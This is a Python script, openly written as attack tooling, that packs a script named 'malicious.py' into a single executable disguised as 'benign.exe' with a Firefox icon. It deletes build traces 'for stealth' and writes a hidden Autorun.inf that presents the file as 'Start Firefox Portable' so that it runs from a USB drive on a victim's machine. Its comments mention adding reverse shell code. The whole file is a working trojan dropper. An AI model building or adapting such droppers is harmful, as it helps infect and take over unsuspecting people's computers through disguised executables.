import PyInstaller.__main__
import shutil
import os

filename = "malicious.py"                       # this is malicious script, we can add reverse shell code in this script
exename = "benign.exe"
icon = "Firefox.ico"
pwd = os.getcwd()                               # gets working directory path
usbdir = os.path.join(pwd,"USB")                # this function is in module os which joins current directory path with 2nd argument provided

if os.path.isfile(exename):                     # if there is already a folder called "USB" remove it
    os.remove(exename)

# Create executable from Python script
PyInstaller.__main__.run([                      
    "malicious.py",
    "--onefile",                                # to generate executable in single file
    "--clean",                                  
    "--log-level=ERROR",                        # does not show logs other than errors
    "--name="+exename,                          # defining executable name
    "--icon="+icon
])

# Clean up after Pyinstaller
shutil.move(os.path.join(pwd,"dist",exename),pwd)       # Pyinstaller creates some directory after conversion, we are going to delete it for stealth
for d in ["dist","build","__pycache__"]:                # these are the directories that Pyinstaller creates
    if os.path.exists(d):
        shutil.rmtree(d)
if os.path.isfile(exename+".spec"):
    os.remove(exename+".spec")

# Create Autorun File incase victim OS has autorun enabled
with open("Autorun.inf","w") as o:
    o.write("(Autorun)\n")
    o.write("Open="+exename+"\n")
    o.write("Action=Start Firefox Portable\n")
    o.write("Label=My USB\n")
    o.write("Icon="+exename+"\n")

# Move files to USB and set to hidden
shutil.move(exename,usbdir)
shutil.move("Autorun.inf",usbdir)
if os.name == 'nt':
    os.system("attrib +h "+os.path.join(usbdir,"Autorun.inf"))